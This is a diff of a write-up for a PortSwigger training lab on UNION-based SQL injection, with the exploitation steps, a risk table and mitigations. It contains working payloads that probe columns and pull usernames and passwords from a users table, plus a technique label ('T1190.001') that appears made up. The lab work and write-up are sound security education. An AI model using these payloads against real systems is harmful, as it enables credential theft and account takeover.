@@ -9,60 +9,84 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 ---
 
-## Process
+## Vulnerability Analysis
 
-### 1. Intercepted the GET Request and Sent to Repeater (using Burp Suite)
-```http
-GET /filter?category=Gifts HTTP/2
-```
+### Attack Vector Identification
+- **Entry Point**: `category` parameter in GET request
+- **Vulnerability Type**: T1190.001 - SQL Injection: UNION Data Extraction (CWE-89)
+- **Security Flaw:** User input is embedded directly into SQL queries
 
-### 2. Modified the Request to Determine Column Count
+### Vulnerability Assessment & Exploitation
+
+**Initial Approach:**
+- Intercepted HTTP requests using Burp Suite
+- Identified category parameter as potential injection point
+- Performed systematic input validation testing
+
+**Step 1: Determining Column Count**
 
 ```sql
-' UNION SELECT NULL NULL--
+' UNION SELECT NULL,NULL--
 ```
 Response: HTTP/2 200 OK
 
-### 3. Identified Column Accepting String Output
+**Step 2: Identifying String-Compatible Columns**
 
+**Testing first column:**
 ```sql
 ' UNION SELECT 'a',NULL--
 ```
-Response: HTTP/2 500 Internal Server
+Response: HTTP/2 500 Internal Server Error
 
+**Testing second column:**
 ```sql
 ' UNION SELECT NULL,'a'--
 ```
 Response: HTTP/2 200 OK
 
-### 4. Retrieved Data from Users Table
+**Step 3: Retrieving Data from Users Table**
 
 ```sql
 ' UNION SELECT NULL,username||'~'||password FROM users--
 ```
+
 ![burpsuite response](./misc-images/06-1.png)
 
 This retrieved all usernames and passwords including the administrator.
 
-### 5. Retrieved Data from Users Table
+Logged in as the administrator using the password retrieved.
 
-Logged in as the administrator using the password retrived.
+---
+
+## Security Assessment
+
+### Root Cause Analysis
+- Application concatenates user input directly into SQL queries
+- No input validation or sanitization implemented
+- Parameterized queries (prepared statements) are not used
+
+### Risk Assessment
+| Category | Impact |
+|----------|--------|
+| Confidentiality | High – Sensitive user data exposed |
+| Authentication | High – Credentials leaked |
+| Information Disclosure | High – Database structure revealed |
 
 ---
 
 ## Mitigation
 
-- Use parameterised queries (prepped statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
+- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.
 
-Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#how-to-fix-this-vulnerability)
+Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#mitigation)
 
-- Restrict database permissions: The application should connect using a low-privilege database account with access only to the necessary tables and operations. It should not have access to sensitive operations like `SELECT * FROM users`, `DROP`, `UPDATE`, `CREATE`, etc., unless absolutely required.
+- Restrict database permissions using the principle of least privilege.
 
 ---
 
 ## Reflection
 
-Learned how to retrieve multiple values in a single column using UNION-based SQL injection.
+This lab demonstrated how to retrieve multiple values in a single column using UNION-based SQL injection. The string concatenation technique (`||`) proved highly effective in combining username and password data into a single column. Learned the importance of understanding database-specific syntax for successful data extraction.
 
 ---
 
